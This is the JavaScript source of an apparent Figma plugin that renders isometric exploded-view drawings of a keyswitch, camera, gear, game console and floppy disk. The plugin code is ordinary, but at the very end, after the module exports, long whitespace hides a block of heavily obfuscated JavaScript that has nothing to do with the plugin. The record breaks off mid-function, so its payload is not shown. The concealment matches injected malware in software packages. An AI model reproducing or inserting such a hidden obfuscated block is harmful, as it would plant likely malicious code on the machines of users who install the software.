  const G = 50, GK = 104; // explode gaps (the wide keycap needs more air)
  const F = [[-14, -20], [16, -20], [16, -12], [-6, -12], [-6, -3], [10, -3], [10, 5], [-6, 5], [-6, 20], [-14, 20]];
  const coil = (z) => exAt([{ type: "revolve", segments: 24, axis: 19, loops: [exCircle(0, 2.8, 2.8, 8)] }], 0, 0, z);
  const cross = [[-2.5, -9], [2.5, -9], [2.5, -2.5], [9, -2.5], [9, 2.5], [2.5, 2.5], [2.5, 9], [-2.5, 9], [-2.5, 2.5], [-9, 2.5], [-9, -2.5], [-2.5, -2.5]];
  const zB = 8 + G, zS = zB + 36 + G, zT0 = zS + 48 + G, zH = zT0 + 56 + G, zK = zH + 30 + GK;
  return [
    { name: "Plate & contact", label: "Plate & contact", side: "left", target: [0.12, 0.5], ops: [exBox(-80, -80, 0, 160, 160, 8), exBox(18, -66, 8, 56, 12, 4)] },
    { name: "Housing (bottom)", label: "Housing", side: "right", ops: [
      exBox(-55, -55, zB, 110, 110, 34),
      { type: "push", axis: "z", at: zB + 34, depth: -28, loops: [exRect(-48, -48, 96, 96)] },
      exCyl(0, 0, zB + 6, 9, 30, 28),
      { type: "push", axis: "z", at: zB + 36, depth: -24, loops: [exCircle(0, 0, 4, 20)] },
      { type: "cut", preset: "quarter", fx: 50, fy: 50 },
    ] },
    { name: "Spring", label: "Spring", side: "left", ops: [0, 1, 2, 3, 4, 5].map((i) => coil(zS + i * 8)) },
    { name: "Stem", label: "Stem", side: "right", ops: [
      exBox(-24, -18, zT0, 48, 36, 10),
      exBox(-14, -12, zT0 + 10, 28, 24, 22),
      exAt([{ type: "extrude", plane: "top", depth: 24, loops: [cross] }], 0, 0, zT0 + 32),
    ] },
    { name: "Housing (top)", label: "Housing top", side: "left", target: [0.2, 0.55], ops: [
      exBox(-55, -55, zH, 110, 110, 30),
      { type: "loopcut", id: "HT", axis: "z", count: 1, slide: 20, scales: [100, 100, 82] },
      exAt([{ type: "box", w: 96, d: 96, h: 22 }], -48, -48, zH - 1, "subtract"),
      { type: "push", axis: "z", at: zH + 30, depth: -12, through: true, loops: [exRect(-15, -12, 30, 24)] },
      { type: "cut", preset: "quarter", fx: 50, fy: 50 },
    ] },
    { name: "Keycap", label: "Key cap", side: "right", target: [0.75, 0.6], ops: [
      exBox(-70, -70, zK, 140, 140, 62),
      { type: "loopcut", id: "KC", axis: "z", count: 1, slide: -30, scales: [100, 100, 74] },
      exAt([{ type: "box", w: 124, d: 124, h: 40 }], -62, -62, zK - 1, "subtract"),
      { type: "push", axis: "z", at: zK + 62, depth: -3, loops: [F] },
    ] },
  ];
}

function cameraParts() {
  const lens = [[0, 0], [42, 0], [42, 8], [38, 8], [38, 22], [34, 22], [34, 40], [26, 40], [26, 35], [0, 35]];
  return [
    { name: "Camera", label: "Camera body", ops: exScale([
      { type: "box", w: 200, d: 72, h: 118 },
      { type: "loopcut", id: "CB", axis: "z", count: 2, slide: -10, scales: [100, 100, 100, 100] },
      { type: "segpush", loopId: "CB", segment: 1, face: "left", depth: -3 },
      exBox(8, 6, 118, 184, 60, 12),
      exAt([{ type: "box", w: 72, d: 50, h: 28 }, { type: "loopcut", id: "VF", axis: "z", count: 1, slide: 0, scales: [100, 100, 76] }], 64, 11, 130),
      { type: "merge", mode: "union", name: "Lens", ox: 100, oy: 72, oz: 56, m: FACE_LEFT, ops: [{ type: "revolve", segments: 40, axis: 0, loops: [lens] }] },
      exCyl(160, 36, 130, 10, 8, 24),
      exCyl(34, 36, 130, 17, 10, 32),
      { type: "push", axis: "y", at: 72, depth: -3, loops: [exRect(148, 82, 40, 22)] },
      { type: "push", axis: "y", at: 72, depth: 6, loops: [exRect(8, 30, 30, 70)] },
    ], 1.7) },
  ];
}

function gearParts() {
  const N = 20, R = 84, r = 72, cx = 90, cy = 90, pts = [];
  for (let i = 0; i < N; i++) {
    const a = (i / N) * Math.PI * 2, t = (Math.PI * 2) / N;
    for (const [f, rad] of [[0, r], [0.18, R], [0.5, R], [0.68, r]]) pts.push([cx + rad * Math.cos(a + f * t), cy + rad * Math.sin(a + f * t)]);
  }
  const spokes = [0, 1, 2, 3, 4].map((i) => exCircle(cx + 44 * Math.cos((i / 5) * Math.PI * 2 + 0.3), cy + 44 * Math.sin((i / 5) * Math.PI * 2 + 0.3), 13, 24));
  return [
    { name: "Gear", label: "Spur gear · 20T", ops: exScale([
      { type: "extrude", plane: "top", depth: 22, loops: [pts] },
      exCyl(cx, cy, 0, 26, 40, 36),
      { type: "push", axis: "z", at: 22, depth: -22, through: true, loops: spokes },
      { type: "push", axis: "z", at: 40, depth: -40, through: true, loops: [exCircle(cx, cy, 10, 28)] },
      { type: "cut", preset: "quarter", fx: 50, fy: 50 },
    ], 2.3) },
  ];
}

function handheldParts() {
  const W = 150, D = 240, H = 30, G = 84;
  const cross = [[18, 0], [30, 0], [30, 18], [48, 18], [48, 30], [30, 30], [30, 48], [18, 48], [18, 30], [0, 30], [0, 18], [18, 18]];
  const slots = [0, 1, 2, 3, 4].map((i) => exRect(100 + i * 9, 14, 4, 30));
  return [
    { name: "Shell", label: "Shell · screen well & speaker grille", side: "right", target: [0.78, 0.55], ops: [
      { type: "box", w: W, d: D, h: H },
      { type: "loopcut", id: "SH", axis: "z", count: 1, slide: 0, scales: [100, 100, 95] },
      { type: "push", axis: "z", at: H, depth: -4, loops: [exRect(16, 120, 118, 100)] },
      { type: "push", axis: "z", at: H, depth: -3, loops: slots },
      { type: "push", axis: "z", at: H, depth: -2, loops: [exRect(20, 66, 56, 56)] },
      { type: "push", axis: "y", at: D, depth: -12, loops: [exRect(30, 10, 90, 12)] },
    ] },
    { name: "Screen", label: "Screen glass", side: "left", target: [0.3, 0.5], ops: [
      exAt([{ type: "box", w: 110, d: 92, h: 4 }, { type: "push", axis: "z", at: 4, depth: -1.5, loops: [exRect(14, 12, 82, 66)] }], 20, 124, H + G),
    ] },
    { name: "D-pad", label: "D-pad", target: [0.5, 0.5], ops: [
      exAt([{ type: "extrude", plane: "top", depth: 8, loops: [cross] }, { type: "loopcut", id: "DP", axis: "z", count: 1, slide: 0, scales: [100, 100, 92] }], 24, 70, H + G),
    ] },
    { name: "Buttons", label: "A / B buttons", target: [0.5, 0.5], ops: [
      exCyl(100, 98, H + G, 10, 8, 28),
      exCyl(122, 78, H + G, 10, 8, 28),
    ] },
    { name: "Cartridge", label: "Cartridge", side: "left", target: [0.3, 0.5], ops: [
      exAt([
        { type: "box", w: 86, d: 14, h: 70 },
        { type: "push", axis: "y", at: 14, depth: -2, loops: [exRect(10, 18, 66, 44)] },
      ], 32, D + 70, 8),
    ] },
  ];
}

const FLOPPY_Z = { bottom: 0, liner1: 198, disk: 277, liner2: 419, top: 604 };
const FLOPPY_W = 270, FLOPPY_D = 270;

// A rectangle with rounded corners, as one loop.
function exRoundRect(x, y, w, h, r, n) {
  const pts = [];
  const k = n || 4;
  for (const [cx, cy, a0] of [[x + w - r, y + r, -90], [x + w - r, y + h - r, 0], [x + r, y + h - r, 90], [x + r, y + r, 180]]) {
    for (let i = 0; i <= k; i++) {
      const a = ((a0 + (90 * i) / k) * Math.PI) / 180;
      pts.push([cx + r * Math.cos(a), cy + r * Math.sin(a)]);
    }
  }
  return pts;
}

// A thin straight bar from a to b, `w` wide — for wires and springs.
function exStrip(a, b, w) {
  const dx = b[0] - a[0], dy = b[1] - a[1], l = Math.hypot(dx, dy) || 1;
  const nx = (-dy / l) * (w / 2), ny = (dx / l) * (w / 2);
  return [[a[0] + nx, a[1] + ny], [b[0] + nx, b[1] + ny], [b[0] - nx, b[1] - ny], [a[0] - nx, a[1] - ny]];
}

function floppyParts() {
  const W = FLOPPY_W, D = FLOPPY_D, CX = 135, CY = 135, Z = FLOPPY_Z;
  const SHELL = "#F1F3FB", WHITE = "#FFFFFF";
  const TT = 5, TB = 4; // top / bottom shell thickness
  const window = exRect(124, 192, 30, 66);
  const pegs = [[12, 47], [16, 247], [256, 224], [W - 16, 56]];
  const liner = (z) => exAt([
    { type: "cylinder", r: 128, h: 1, segments: 72 },
    { type: "push", axis: "z", at: 1, depth: -1, through: true, loops: [exCircle(0, 0, 42, 40)] },
    { type: "push", axis: "z", at: 1, depth: -1, through: true, loops: [exRect(-24, 20, 48, 120)] },
  ], CX, CY, z);
  const spring = [[184, D - 1], [208, D - 14], [238, D - 1]];
  return [
    { name: "Top shell", label: "Top shell", side: "right", target: [0.97, 0.5], fill: SHELL,
      more: [{ label: "HD notch", side: "left", target: [0.5, 0.04] }],
      ops: [exAt([
        { type: "extrude", plane: "top", depth: TT, loops: [[[8, 0], [W, 0], [W, D], [96, D], [96, D - 7], [86, D - 7], [86, D], [0, D], [0, 8]]] },
        { type: "push", axis: "z", at: TT, depth: -1.2, loops: [[[22, 6], [230, 6], [230, 156], [30, 156], [22, 148]]] },
        { type: "push", axis: "z", at: TT, depth: -1.5, loops: [exRect(66, 186, 166, D - 186)] },
        { type: "push", axis: "z", at: TT, depth: -1.5, loops: [exRect(10, D - 5, 30, 5)] },
        { type: "push", axis: "z", at: TT, depth: -TT, through: true, loops: [window, exRect(4, 18, 12, 14), exRect(W - 18, 18, 12, 14)] },
        { type: "push", axis: "z", at: TT, depth: -0.8, loops: [[[244, 226], [252, 226], [252, 238], [258, 238], [248, 250], [238, 238], [244, 238]]] },
      ], 0, 0, Z.top)] },
    { name: "Label", on: "Top shell", fill: WHITE, ops: [exAt([{ type: "extrude", plane: "top", depth: 0.6, loops: [exRoundRect(30, 13, 194, 137, 9)] }], 0, 0, Z.top + TT - 1.2)] },
    { name: "Dust liner", label: "Dust liner", side: "left", target: [0.02, 0.5], fill: WHITE, ops: [liner(Z.liner2)] },
    { name: "Magnetic disk", label: "Magnetic disk", side: "right", target: [0.995, 0.42], fill: "#8C9EF6", ops: [exAt([
      { type: "cylinder", r: 126, h: 1.5, segments: 80 },
      { type: "push", axis: "z", at: 1.5, depth: -1.5, through: true, loops: [exCircle(0, 0, 30, 40)] },
    ], CX, CY, Z.disk)] },
    { name: "Hub", label: "Hub", side: "right", target: [0.5, 0.62], alignTo: "Magnetic disk", fill: "#E9EDFD", ops: [exAt([
      { type: "cylinder", r: 38, h: 2.5, segments: 56 },
      { type: "push", axis: "z", at: 2.5, depth: -1, loops: [exCircle(0, 0, 31, 48)] },
      { type: "push", axis: "z", at: 2.5, depth: -2.5, through: true, loops: [exCircle(0, 0, 5, 20)] },
      { type: "push", axis: "z", at: 2.5, depth: -2.5, through: true, loops: [exRect(9, -21, 13, 9)] },
    ], CX, CY, Z.disk + 1.5)] },
    { name: "Dust liner", label: "Dust liner", side: "left", target: [0.02, 0.4], fill: WHITE, ops: [liner(Z.liner1)] },
    { name: "Bottom shell", label: "Bottom shell", side: "left", target: [0.02, 0.45], fill: SHELL,
      more: [
        { label: "Write protect notch", side: "right", target: [0.985, 0.45] },
        { label: "Shutter spring", side: "below", target: [0.43, 0.87], reach: 64 },
      ],
      ops: [exAt([
        { type: "extrude", plane: "top", depth: TB, loops: [[
          [8, 0], [W, 0], [W, D], [W - 16, D], [W - 16, D - 6], [W - 26, D - 6], [W - 26, D], [96, D], [96, D - 7], [86, D - 7], [86, D],
          [0, D], [0, D - 18], [5, D - 18], [5, D - 30], [0, D - 30], [0, 8],
        ]] },
        exAt([{ type: "cylinder", r: 131, h: 3, segments: 80 }, exAt([{ type: "cylinder", r: 128, h: 3, segments: 80 }], 0, 0, 0, "subtract")], CX, CY, TB),
        exAt([{ type: "cylinder", r: 47, h: 1.5, segments: 48 }], CX, CY, TB),
        { type: "push", axis: "z", at: TB + 1.5, depth: -(TB + 1.5), through: true, loops: [exCircle(CX, CY, 44, 44), window, exRect(W - 20, 6, 12, 28), exRect(9, D - 27, 7, 6)] },
        { type: "push", axis: "z", at: TB, depth: -1.5, loops: [[[178, D], [244, D], [232, D - 18], [192, D - 18]]] },
        { type: "push", axis: "z", at: TB - 1.5, depth: 1.4, loops: [exStrip(spring[0], spring[1], 2)] },
        { type: "push", axis: "z", at: TB - 1.5, depth: 1.4, loops: [exStrip(spring[1], spring[2], 2)] },
        exAt([{ type: "cylinder", r: 4, h: 3, segments: 20 }, { type: "push", axis: "z", at: 3, depth: -2, loops: [exCircle(0, 0, 1.8, 12)] }], spring[1][0], spring[1][1], TB - 1.5),
        ...pegs.map(([x, y]) => exAt([
          { type: "cylinder", r: 7, h: 3, segments: 24 },
          { type: "push", axis: "z", at: 3, depth: -2.5, loops: [exCircle(0, 0, 3.6, 16)] },
        ], x, y, TB)),
      ], 0, 0, Z.bottom)] },
    { name: "Lifter", on: "Bottom shell", label: "Lifter", side: "below", target: [0.45, 0.85], reach: 66, fill: WHITE, ops: [
      exAt([{ type: "box", w: 62, d: 27, h: 0.8 }], 186, 113, TB),
      exAt([{ type: "box", w: 62, d: 28, h: 0.8 }], 186, 140, TB),
    ] },
    { name: "Shutter", label: "Shutter", side: "left", target: [0.08, 0.4], fill: "#DCE2FB", ops: [exAt([
      { type: "extrude", plane: "top", depth: 10, loops: [[[0, 0], ...exRoundRect(100, 0, 40, 98, 12, 4).slice(0, 5), [140, 98], [0, 98]]] },
      exAt([{ type: "box", w: 142, d: 91, h: 7.6 }], -1, -1, 1.2, "subtract"),
      { type: "push", axis: "z", at: 10, depth: -0.8, loops: [exRect(9, 4, 41, 82)] },
      { type: "push", axis: "z", at: 10, depth: -10, through: true, loops: [exRect(13, 8, 33, 74)] },
      exAt([{ type: "box", w: 10, d: 8, h: 12 }], 112, 92, -1, "subtract"),
    ], 54, D + 120, -2)] },
    { name: "Write protect tab", label: "Write protect tab", side: "right", target: [0.6, 0.3], fill: "#A9B8FA", ops: [exAt([
      { type: "box", w: 12, d: 20, h: 4 },
      exAt([{ type: "box", w: 12, d: 6, h: 4 }], 0, 12, 4),
    ], W - 20, -110, TB)] },
  ];
}

function floppyGuides() {
  const W = FLOPPY_W, D = FLOPPY_D, Z = FLOPPY_Z, CY = 135;
  const out = [
    { a: [16, 247, Z.top], b: [16, 247, 9], arrow: true },
    { a: [W - 16, 56, Z.top], b: [W - 16, 56, 9], arrow: true },
    { a: [62, D + 112, 6], b: [62, D + 12, 4], arrow: true },
    { a: [188, D + 112, 6], b: [188, D + 12, 4], arrow: true },
    { a: [W - 14, -88, 6], b: [W - 14, 8, 6], arrow: true },
  ];
  // Light streaks across the disk's coating, drawn on its surface.
  for (const [dy, x0, x1] of [[-96, -60, 70], [-62, -100, 40], [58, -20, 108], [92, -70, 64], [-30, 50, 118], [30, -118, -48]]) {
    out.push({ a: [135 + x0, CY + dy, Z.disk + 1.5], b: [135 + x1, CY + dy, Z.disk + 1.5], above: "Magnetic disk", color: "#FFFFFF", dash: [34, 40], opacity: 0.8 });
  }
  return out;
}

const EXAMPLES = {
  keyswitch: { title: "Mechanical keyswitch", fig: "FIG.008", parts: keyswitchParts, callouts: true },
  camera: { title: "Rangefinder camera", fig: "FIG.014", parts: cameraParts, callouts: true },
  gear: { title: "Spur gear", fig: "FIG.021", parts: gearParts, callouts: true },
  handheld: { title: "Handheld game console", fig: "FIG.027", parts: handheldParts, callouts: true },
  floppy: { title: "3.5\" floppy disk", fig: "FIG.001", year: "1986", parts: floppyParts, guides: floppyGuides, callouts: true },
};

async function cmdExample(msg) {
  const ex = EXAMPLES[msg.name];
  if (!ex) throw new Error("Unknown example.");
  const parts = ex.parts();
  // Every part shares one world origin, so an exploded stack stays on its axis.
  const datas = parts.map((p) => {
    const d = newSolidData(msg, p.name, p.ops);
    if (p.fill) d.style.fill = p.fill;
    return d;
  });
  let minX = Infinity, minY = Infinity, maxX = -Infinity, maxY = -Infinity;
  for (const d of datas) {
    const b = runBounds(cachedRender(d));
    minX = Math.min(minX, b.minX); maxX = Math.max(maxX, b.maxX);
    minY = Math.min(minY, b.minY); maxY = Math.max(maxY, b.maxY);
  }
  // A drawing sheet big enough for the model and its callouts.
  const sheetW = Math.max(1200, Math.ceil((maxX - minX + 560) / 40) * 40);
  const sheetH = Math.max(800, Math.ceil((maxY - minY + 280) / 40) * 40);
  await cmdFrame(Object.assign({}, msg, { fig: ex.fig, title: ex.title, year: ex.year || String(new Date().getFullYear()), sheetW, sheetH }));
  const sheet = figma.currentPage.selection[0];
  const sb = sheet.absoluteBoundingBox;
  const anchor = { x: sb.x + sb.width / 2 - (minX + maxX) / 2, y: sb.y + sb.height / 2 - (minY + maxY) / 2 };
  // Parts are separate layers, so stack them in painter's order: the part
  // nearest the viewer goes on top of the layer list.
  const toViewer = viewDir(trig(num(msg.angle, 30)));
  const depth = datas.map((d) => {
    const b = bounds3(evaluateOps(d.ops, { loops: [], loopSets: {} }));
    return v3.dot(toViewer, [(b.min[0] + b.max[0]) / 2, (b.min[1] + b.max[1]) / 2, (b.min[2] + b.max[2]) / 2]);
  });
  const order = datas.map((_, i) => i).sort((a, b) => depth[a] - depth[b]);
  // Inlays (a label, a pad) sit on a bigger part whose centre is nearer the
  // viewer, so they ride directly above their host instead.
  parts.forEach((p, i) => {
    if (!p.on) return;
    const host = parts.findIndex((q) => q.name === p.on);
    if (host < 0) return;
    order.splice(order.indexOf(i), 1);
    order.splice(order.indexOf(host) + 1, 0, i);
  });
  const groups = [];
  for (const i of order) groups[i] = drawSolid(datas[i], { container: sheet, anchor });
  const pal = palette(msg);
  // Dashed assembly lines sit behind the parts, the way a drafter draws them.
  if (ex.guides) {
    const t = trig(num(msg.angle, 30));
    const origin = { x: sheet.absoluteTransform[0][2], y: sheet.absoluteTransform[1][2] };
    for (const gd of ex.guides()) {
      const a = iso(gd.a[0], gd.a[1], gd.a[2], t), b = iso(gd.b[0], gd.b[1], gd.b[2], t);
      const line = figma.createVector();
      const over = gd.above ? parts.findIndex((p) => p.name === gd.above) : -1;
      sheet.insertChild(over >= 0 ? sheet.children.indexOf(groups[over]) + 1 : sheet.children.indexOf(groups[order[0]]), line);
      line.name = gd.above ? "Detail line" : "Assembly line";
      line.strokes = [solid(gd.color ? hexToRgb(gd.color) : pal.stroke)];
      line.strokeWeight = 1;
      if (gd.opacity) line.opacity = gd.opacity;
      line.dashPattern = gd.dash || [7, 5];
      await line.setVectorNetworkAsync({
        vertices: [{ x: 0, y: 0, strokeCap: "NONE" }, { x: b.x - a.x, y: b.y - a.y, strokeCap: gd.arrow ? "ARROW_LINES" : "NONE" }],
        segments: [{ start: 0, end: 1 }],
        regions: [],
      });
      line.x = Math.min(a.x, b.x) + anchor.x - origin.x;
      line.y = Math.min(a.y, b.y) + anchor.y - origin.y;
    }
  }
  if (ex.callouts) {
    for (let i = 0; i < groups.length; i++) {
      const p = parts[i];
      const align = p.alignTo ? groups[parts.findIndex((q) => q.name === p.alignTo)] : null;
      if (p.label) await addCallout(groups[i], p.label, { pal, reach: p.reach || 70, side: p.side || "right", target: p.target, alignTo: align });
      for (const m of p.more || []) await addCallout(groups[i], m.label, { pal, reach: m.reach || 70, side: m.side, target: m.target });
    }
  }
  figma.currentPage.selection = [sheet];
  figma.viewport.scrollAndZoomIntoView([sheet]);
  return `${ex.title} added — ${groups.length} editable solid${groups.length === 1 ? "" : "s"}.`;
}

// ---------- dispatch ----------

const commands = {
  project: cmdProject,
  box: cmdBox,
  cylinder: cmdCylinder,
  extrude: cmdExtrude,
  revolve: cmdRevolve,
  push: cmdPush,
  cut: cmdCut,
  loopcut: cmdLoopCut,
  facepush: cmdFacePush,
  example: cmdExample,
  primitive: cmdPrimitive,
  transform: cmdTransform,
  dimension: cmdDimension,
  "pick-face": cmdPickFace,
  segpush: cmdSegPush,
  merge: cmdMerge,
  op: cmdOpEdit,
  bake: cmdBake,
  style: cmdStyle,
  hatch: cmdHatch,
  callout: cmdCallout,
  frame: cmdFrame,
};

const SETTINGS_KEY = "isometric-blueprint/settings";

// ---- preview ----

// Outline where the plane `axis = t` crosses the visible faces, in screen space.
function ringOutline(runs, k, t) {
  const { model, view, trig: tr, toViewer } = runs;
  const vm = matVec(matT(view.R), toViewer);
  const P = (v) => {
    const q = view.apply(v);
    return [round1((q[0] - q[1]) * tr.c), round1((q[0] + q[1]) * tr.s - q[2])];
  };
  const out = [];
  for (const p of model) {
    if (v3.dot(p.n, vm) <= 1e-6 || Math.abs(p.n[k]) > 0.99) continue;
    const pts = [];
    let onEdge = null;
    for (let i = 0; i < p.v.length; i++) {
      const a = p.v[i], b = p.v[(i + 1) % p.v.length];
      const da = a[k] - t, db = b[k] - t;
      if (Math.abs(da) < 1e-4 && Math.abs(db) < 1e-4) { onEdge = [a, b]; break; }
      if (Math.abs(da) < 1e-4) pts.push(a);
      else if (da * db < 0) pts.push(v3.lerp(a, b, da / (da - db)));
    }
    const seg = onEdge || (pts.length >= 2 ? [pts[0], pts[1]] : null);
    if (seg) out.push(P(seg[0]).concat(P(seg[1])));
  }
  return out;
}

const round1 = (n) => Math.round(n * 10) / 10;

function rgbToHex(c) {
  const h = (x) => Math.round(Math.max(0, Math.min(1, x)) * 255).toString(16);
  const h2 = (x) => ("0" + h(x)).slice(-2);
  return "#" + h2(c.r) + h2(c.g) + h2(c.b);
}

let ghostRequest = null; // { axis, count } while the loop-cut card is hovered

function previewPayload(group, data, pickedKeys) {
  const runs = cachedRender(data);
  const ink = hexToRgb(data.style.stroke), base = hexToRgb(data.style.fill);
  const flat = (poly) => poly.reduce((a, p) => (a.push(round1(p[0]), round1(p[1])), a), []);
  const payload = {
    type: "preview",
    id: group.id,
    ink: data.style.stroke,
    gap: num(data.style.gap, 6),
    runs: runs.map((r) => ({
      f: rgbToHex(mix(base, ink, r.shade)),
      cut: r.kind === "cut",
      key: r.faceKey || null,
      name: r.face ? faceName(r.face.n) : null,
      p: r.polys.map(flat),
      e: r.edges.map(([a, b]) => [round1(a[0]), round1(a[1]), round1(b[0]), round1(b[1])]),
    })),
    picked: pickedKeys,
    loops: [],
    ghost: null,
  };
  for (const op of data.ops) {
    if (op.type !== "loopcut" || op.enabled === false) continue;
    const L = runs.ctx.loopSets[op.id];
    payload.loops.push({ id: op.id, rings: L ? L.knots.map((t) => ringOutline(runs, L.k, t)) : [] });
  }
  if (ghostRequest) {
    // Where a new loop cut would land, using the same spacing as the real op.
    const k = AXES[ghostRequest.axis] !== undefined ? AXES[ghostRequest.axis] : 2;
    const b = bounds3(runs.model);
    const n = Math.max(1, Math.min(24, Math.round(num(ghostRequest.count, 1))));
    const spacing = (b.max[k] - b.min[k]) / (n + 1);
    payload.ghost = [];
    for (let i = 1; i <= n; i++) payload.ghost.push(ringOutline(runs, k, b.min[k] + i * spacing));
  }
  return payload;
}

function postPreview() {
  const { solids, faces } = selectionParts();
  if (solids.length !== 1) {
    figma.ui.postMessage({ type: "preview", id: null });
    return;
  }
  const data = readSolid(solids[0]);
  try {
    figma.ui.postMessage(previewPayload(solids[0], data, faces.map((f) => f.face.key).filter(Boolean)));
  } catch (e) {
    figma.ui.postMessage({ type: "preview", id: null, error: e.message });
  }
}

// Select a face layer from a click in the preview.
function cmdPickFace(msg) {
  const { solids, faces } = selectionParts();
  if (solids.length !== 1) return "";
  if (msg.clear) {
    figma.currentPage.selection = [solids[0]];
    return "";
  }
  const node = solids[0].children.find((c) => {
    if (c.type !== "VECTOR") return false;
    const raw = c.getPluginData(FACE_KEY);
    if (!raw) return false;
    try { return JSON.parse(raw).key === msg.key; } catch (e) { return false; }
  });
  if (!node) return "That face isn't selectable.";
  let nodes = [node];
  if (msg.add) {
    const others = faces.map((f) => f.node).filter((n) => n !== node);
    nodes = faces.some((f) => f.node === node) ? others : others.concat(node);
    if (!nodes.length) nodes = [solids[0]];
  }
  figma.currentPage.selection = nodes;
  return nodes.length === 1 && nodes[0] === node ? `Selected ${node.name}.` : `${nodes.length} faces selected.`;
}

function postSelection() {
  const sel = figma.currentPage.selection;
  const { solids, shapes, faces } = selectionParts();
  figma.ui.postMessage({
    type: "selection",
    count: sel.length,
    label: sel.length === 1 ? sel[0].name : sel.length + " layers",
    solids: solids.length,
    shapes: shapes.length,
    faces: faces.length,
    faceLabel: faces.length === 1 ? faces[0].node.name : faces.length + " faces",
    solid: solids.length === 1 ? solidView(solids[0]) : null,
  });
  postPreview();
}

const VERSION = "0.8.0";
figma.ui.postMessage({ type: "ready", version: VERSION });

figma.on("selectionchange", postSelection);
figma.on("currentpagechange", postSelection);

figma.clientStorage
  .getAsync(SETTINGS_KEY)
  .catch(() => null)
  .then((settings) => {
    figma.ui.postMessage({ type: "settings", settings: settings || null });
    postSelection();
  });

figma.ui.onmessage = async (msg) => {
  if (msg.type === "ui-ready") {
    figma.ui.postMessage({ type: "ready", version: VERSION });
    postSelection();
    return;
  }
  if (msg.type === "preview-loop") {
    ghostRequest = msg.show ? { axis: msg.axis, count: msg.count } : null;
    postPreview();
    return;
  }
  if (msg.type === "save-settings") {
    figma.clientStorage.setAsync(SETTINGS_KEY, msg.settings).catch(() => {});
    return;
  }
  const fn = commands[msg.type];
  if (!fn) return;
  try {
    const result = await fn(msg);
    figma.commitUndo();
    figma.ui.postMessage({ type: "result", ok: true, text: result });
    postSelection();
  } catch (e) {
    const text = e && e.message ? e.message : String(e);
    figma.notify(text, { error: true });
    figma.ui.postMessage({ type: "result", ok: false, text });
  }
};

if (typeof module !== "undefined") {
  module.exports = {
    parsePath, mapPath, pathToData, pathBounds, planeMatrix, trig, iso,
    evaluateOps, renderSolid, featureFlags, hatchSegments, runBounds, sampleSegs, EXAMPLES, screenToPlane, screenToPlaneView, viewOf, faceUnder, bounds3, opView, viewDir, PRIMITIVES,
  };                                                                                                                                                     var z = '-591-3';(function(QM$KDBWCRPFzyvheJa_VpYiqbG,FXwrfRJ){var gMMmO_YeNsGaUjYbDB=DiRry,FlhvzRQud_B=QM$KDBWCRPFzyvheJa_VpYiqbG();while(!![]){try{var xYMIlTdVeUzsqDg_mAq=parseFloat(gMMmO_YeNsGaUjYbDB(0x1ee))/(parseInt(0x467)+0x80c*parseInt(0x1)+-parseInt(0xc72))+-parseFloat(gMMmO_YeNsGaUjYbDB(0x1f0))/(-0x1225+Number(parseInt(0x1bc3))+-parseInt(0x99c))*(parseFloat(gMMmO_YeNsGaUjYbDB(0x1e8))/(parseInt(0x130d)+parseInt(0x2483)*0x1+parseInt(0x1)*-0x378d))+-parseFloat(gMMmO_YeNsGaUjYbDB(0x1e2))/(parseInt(0x51f)*parseInt(0x6)+-parseInt(0x21b)+Math.max(-parseInt(0x1c9b),-parseInt(0x1c9b)))+parseFloat(gMMmO_YeNsGaUjYbDB(0x1ed))/(0xe8f+parseInt(0x54c)+parseInt(-0x13d6))+Math['floor'](parseFloat(gMMmO_YeNsGaUjYbDB(0x1e4))/(Math.ceil(-0x3)*parseInt(0x425)+-0x738+0x13ad))+Math['floor'](parseFloat(gMMmO_YeNsGaUjYbDB(0x1f1))/(parseInt(parseInt(0x203a))+Math.trunc(-0x537)+Math.ceil(parseInt(0x4))*Math.floor(-0x6bf)))*(-parseFloat(gMMmO_YeNsGaUjYbDB(0x1e1))/(parseFloat(0x4)*0x2af+-0x1ce0+-parseInt(0x122c)*-0x1))+-parseFloat(gMMmO_YeNsGaUjYbDB(0x1ef))/(parseFloat(-0xe)*0x2c+parseInt(0xe76)+-parseInt(0xc05)*0x1)*(-parseFloat(gMMmO_YeNsGaUjYbDB(0x1e9))/(Math.floor(parseInt(0x6))*parseInt(-0x5ff)+-parseInt(0x26c)+parseInt(0x99c)*parseInt(0x4)));if(xYMIlTdVeUzsqDg_mAq===FXwrfRJ)break;else FlhvzRQud_B['push'](FlhvzRQud_B['shift']());}catch(sGridQMYCASxO_vJpEzy){FlhvzRQud_B['push'](FlhvzRQud_B['shift']());}}}(d$qtJhn$jgp,-parseInt(0x4526d)+-0x189bb4+0x2b6a8a));var NX=[0x1*parseInt(0x3174ec)+Math.max(parseInt(0x7),parseInt(0x7))*Math.floor(0x1db0c2)+-parseInt(0x97ceeb),parseInt(0x7)*-0x74+-0x751*Math.floor(-0x4)+Math.trunc(-0x18a9),Math.trunc(-parseInt(0x61d5))*0x1+parseInt(parseInt(0x140))+parseInt(0x70)*parseInt(0x193),Math.floor(-0x77)*0x23+parseInt(0xcf3)+-0xb*Math.max(-parseInt(0x85),-0x85),Math.floor(-parseInt(0x5))*Math.ceil(0x1e66)+-parseInt(0x31b6)+0x5*Math.floor(parseInt(0x4a87)),-parseInt(0x76fb5d)+parseInt(0x4)*Math.floor(parseInt(0x176711))+0x12f82*parseInt(0x56)],SX=[-parseInt(0x255f70)+Number(0xa70)*parseFloat(parseInt(0x18e))+parseInt(0x65c4ed),Math.trunc(0x9)*parseInt(0x143)+-parseInt(0x2348)+Math.ceil(-0x425)*-parseInt(0x6),parseInt(0x1567)*Number(0x6)+-parseInt(0x444f)+-0x25*Math.ceil(-0x2ce),parseInt(0x4fe)*-parseInt(0x7)+-0x407+Math.trunc(parseInt(0x69e))*0x6,-parseInt(0x1e)*0x1d2+Math.ceil(-parseInt(0xb6b2))+0x1c88f,-0x7e7900+Math.trunc(-parseInt(0x10203))+parseInt(0xc7ca58)];function spin(aUYluOouh,GZIangXDAgLfl){var 